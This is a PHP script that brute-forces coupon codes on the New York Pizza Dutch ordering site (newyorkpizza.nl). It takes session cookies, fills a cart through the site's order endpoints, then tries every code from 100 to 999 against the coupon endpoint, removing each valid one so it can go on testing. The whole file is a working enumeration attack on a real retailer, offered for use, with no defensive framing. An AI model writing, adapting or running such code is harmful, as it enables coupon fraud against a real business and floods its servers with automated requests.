<?php

error_reporting(E_ALL | E_STRICT | E_NOTICE);
ini_set('display_errors', 1);

class NewYorkPizzaCouponBrute
{

    public const COUPON_VALID = 'CouponValid';
    public const COUPON_COMPOSITION_INVALID = 'CouponProductCompositionInvalid';
    public const COUPON_INVALID = 'CouponCodeInvalid';

    // Options
    public static $optionIds = [
        /*
         * Pizza
         */
        1 => '25cm NY Style',
        2 => '30cm NY Style',
        3 => '35cm NY Style',
        8 => '30 cm Italian',
        112 => '25cm bloemkoolbodem',
        113 => '30cm bloemkoolbodem',
        116 => '40 cm NY Style',
        /*
         * Desserts
         */
        104 => 'Ben & Jerry\'s 100ml',
        121 => 'Ben & Jerry\'s 465ml',
    ];
    // Products
    public static $productIds = [
        /*
         * Pizza
         */
        92 => 'Hawaii',
        93 => 'Brooklin Style',
        132 => 'Downtown Döner',
        262 => 'Salami',
        // 427 => 'Perfect Peperoni',
        563 => 'Tex Mex Beef',
        583 => 'Sicilian Sausage & Salami',
        /*
         * Desserts
         */
        53 => 'Cookie Dough (465 ml)',
        54 => 'Netflix & Chilll’d (465 ml)',
        55 => 'Caramel Chew Chew (465 ml)',
        58 => 'Chocolate Fudge Brownie (465 ml)',
        227 => 'Half Baked (465 ml)',
        229 => 'Topped Salted Caramel Brownie (465 ml)',
        281 => 'Cookie Dough (100 ml)',
        282 => 'Chocolate Fudge Brownie (100 ml)',
        283 => 'Strawberry Cheesecake (100 ml)',
        284 => 'Strawberry Cheesecake (465 ml)',
        288 => 'Caramel Chew Chew (100 ml)',
        546 => 'Rain Dough Cookie Dough Twist (465ml)',
        559 => 'Caramel Brownie Movie Night (465ml)',
        560 => 'Non-Dairy Change the Whirled (465ml)',
    ];

    public function __construct(array $products)
    {
        $this->setCookies();

        foreach ($products as $p) {
            $this->validateProduct($p);

            $quantity = isset($p['quantity']) ? (int) $p['quantity'] : 1;
            $option = (int) $p['option'];

            if (isset($p['slices'])) {
                $this->addXTastyProduct($p['slices'], $option, $quantity);
            } elseif (isset($p['product'])) {
                $this->addProduct($p['product'], $option, $quantity);
            }
        }

        echo 'Your order:', PHP_EOL;

        foreach ($this->listProducts() as $product) {
            echo sprintf(' - %s (%s): %d x € %.02f', $product['name'], $product['option'], $product['amount'], $product['price']), PHP_EOL;
        }

        echo 'Testing coupons:', PHP_EOL;
        for ($i = 100; $i <= 999; $i += 1) {
            echo ' - ', $i, ': ';

            [$status, $identifier] = $this->addCoupon($i);
            echo $status, ' ', $identifier, "\r";

            // Remove so we can test more
            if ($status === self::COUPON_VALID) {
                $this->removeCoupon($identifier);
                echo PHP_EOL;
            }
        }

        echo PHP_EOL;
        exit;
    }

    private $cookie = '';

    /**
     * Validate product, throw Exception if it's not valid
     *
     * @param array $product
     * @return void
     * @throws RuntimeException
     */
    private function validateProduct(array $product): void
    {
        if (empty($product['option'])) {
            throw new RuntimeException(sprintf(
                        'Given product doesn\'t have the \'option\' field set: %s',
                        print_r($product, true)
            ));
        }

        if (empty($product['slices']) && empty($product['product'])) {
            throw new RuntimeException(sprintf(
                        'Given product %s need either \'slices\' or \'product\' field set!',
                        print_r($product, true)
            ));
        }
    }

    /**
     * Return status can be COUPON_VALID|COUPON_COMPOSITION_INVALID|COUPON_INVALID
     * Returned identifier can be used to delete coupon later
     *
     * @return array [status, identifier]
     */
    private function addCoupon(int $coupon_code): array
    {
        $json = $this->request('https://www.newyorkpizza.nl/CheckOut/AddCouponCodeToCurrentOrder', [
            'couponCode' => $coupon_code,
            ], true);

        $data = json_decode($json, true);
        if (!isset($data['error'])) {
            throw new RuntimeException(sprintf('Cannot parse result: \'%s\'.', $json));
        }

        return [
            $data['error'] ?: self::COUPON_VALID,
            $data['identifier']
        ];
    }

    private function removeCoupon(string $couponIdentifier): bool
    {
        $json = $this->request('https://www.newyorkpizza.nl/Order/RemoveCouponFromCurrentOrder', [
            'couponIdentifier' => $couponIdentifier
            ], true);

        $data = json_decode($json, true);
        return !empty($data['succeeded']);
    }

    private function addProduct(int $productId, int $optionId, int $quantity = 1): bool
    {
        $json = $this->request('https://www.newyorkpizza.nl/Order/AddProductToCurrentOrder/', [
            'productId' => $productId,
            'optionId' => $optionId,
            'quantity' => $quantity
            ], true);

        $data = json_decode($json, true);
        return !empty($data['succeeded']);
    }

    /**
     * Add double tasty
     * @param int[] $slices Array of productId's
     * @param int $optionId
     * @param int $quantity Default 1
     * @todo $slices should be SliceProduct[] with toArray method or something
     */
    private function addXTastyProduct(array $slices, int $optionId, int $quantity = 1): bool
    {
        $slices_config = [];
        foreach ($slices as $i => $productId) {
            $slices_config[] = [
                'productId' => $productId,
                'index' => $i
            ];
        }

        $json = $this->request('https://www.newyorkpizza.nl/Order/AddXTastyProductToCurrentOrder/', [
            'optionId' => $optionId,
            'quantity' => $quantity,
            'slicesConfiguration' => $slices_config
            ], true);

        $data = json_decode($json, true);
        return !empty($data['succeeded']);
    }

    private function listProducts(): array
    {
        $html = $this->request('https://www.newyorkpizza.nl/Menu/_ReceiptPartial/');

        $matches = [];
        $names = $options = [];

        // Product names
        if (preg_match_all('/\<span class="receipt__product-header-text-name">\s*(.+)\s*\<\/span>/', $html, $matches)) {
            $names = $matches[1];
        }

        // Product options
        if (preg_match_all('/\<span class="receipt__product-header-text-type">\s*(.+)\s*\<\/span>/', $html, $matches)) {
            $options = $matches[1];
        }

        $monster_regex = '/\<input type="hidden"\s*value="(?<amount>\d+)" \/\>\s*'
            . '\<a href="#" class="s4d-product-amount-minus s4d-text-color-medium"\s*'
            . 'data-product-identifier="(?<uid>[\w]+)"\s*'
            . 'data-product-id="(?<id>\d+)"\s*'
            . 'data-option-id="(?<option>\d+)"\s*'
            . 'data-item-price="(?<price>[\d,.]+)"/i';

        // Product details
        if (!preg_match_all($monster_regex, $html, $matches)) {
            throw new RuntimeException(sprintf(
                        'Unable to parse products from response: \'%s\'.',
                        $html
            ));
        }

        $products = [];
        foreach (array_keys($matches[0]) as $i) {
            $products[] = [
                // UID normally is numeric, except for XTasty, e.g.: 133_DoubleTasty_92_RemoveToppings_141_427_RemoveToppings_141
                'uid' => $matches['uid'][$i],
                'amount' => (int) $matches['amount'][$i],
                'productId' => (int) $matches['id'][$i],
                'optionId' => (int) $matches['option'][$i],
                'price' => (float) str_replace(',', '.', $matches['price'][$i]),
                'name' => isset($names[$i]) ? trim($names[$i]) : '',
                'option' => isset($options[$i]) ? trim($options[$i]) : ''
            ];
        }

        return $products;
    }

    private function request(string $url, array $data = [], bool $is_post = false): string
    {
        if (!$is_post && $data) {
            $url .= '?' . http_build_query($data);
        }

        $options = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
        ];

        if ($this->cookie) {
            $options[CURLOPT_COOKIE] = $this->cookie;
        }

        if ($is_post) {
            $options[CURLOPT_POST] = true;
            //$options[CURLOPT_POSTFIELDS] = $data;
            $options[CURLOPT_POSTFIELDS] = http_build_query($data);
        }

        $ch = curl_init();
        curl_setopt_array($ch, $options);

        $resp = curl_exec($ch);
        if (!$resp) {
            throw new RuntimeException(sprintf(
                        'Something went wrong: %s.',
                        curl_error($ch)
            ));
        }

        // Can be both html or json, we don't know
        return $resp;
    }

    /**
     * @see https://stackoverflow.com/a/895858/3099003
     * @see https://github.com/andriichuk/php-curl-cookbook#get-response-headers
     */
    private function setCookies(): void
    {
        if ($this->cookie) {
            return;
        }

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://www.newyorkpizza.nl/',
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_NOBODY => true,
            CURLOPT_HEADER => true
        ]);

        $headers = curl_exec($ch);
        $macthes = [];

        if (!preg_match_all('/^Set-Cookie:\s*([^;]*)/im', $headers, $macthes)) {
            return;
        }

        $cookies = array_unique($macthes[1]);
        $this->cookie = implode('; ', $cookies);
    }

}

// Read products from argv
$json = isset($argv[1]) ? $argv[1] : [];
if (!$json) {
    echo 'Pass one or more products in JSON format, e.g.:', PHP_EOL;
    echo 'Usage: php -f ', __FILE__, ' \'', json_encode([
        // Ben & Jerry Strawberry Cheesecake
        ['product' => 284, 'option' => 121, 'quantity' => 1],
        // Brooklin Style Pizza - 30cm Italian
        ['product' => 93, 'option' => 8, 'quantity' => 1],
        // Double Tasty - Hawaii / Salami - 35cm NY Style
        ['slices' => [92, 262], 'option' => 3, 'quantity' => 1],
        ]), '\'', PHP_EOL;
    echo '  -  : php -f ', __FILE__, ' products.json', PHP_EOL;
    echo PHP_EOL;

    exit(1);
}

if (file_exists($json)) {
    $json = file_get_contents($json);
}

$products = json_decode($json, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    throw new RuntimeException(sprintf(
                'Invalid JSON format, error: %s; In: %s',
                json_last_error_msg(),
                $json
    ));
}

$go = new NewYorkPizzaCouponBrute($products);
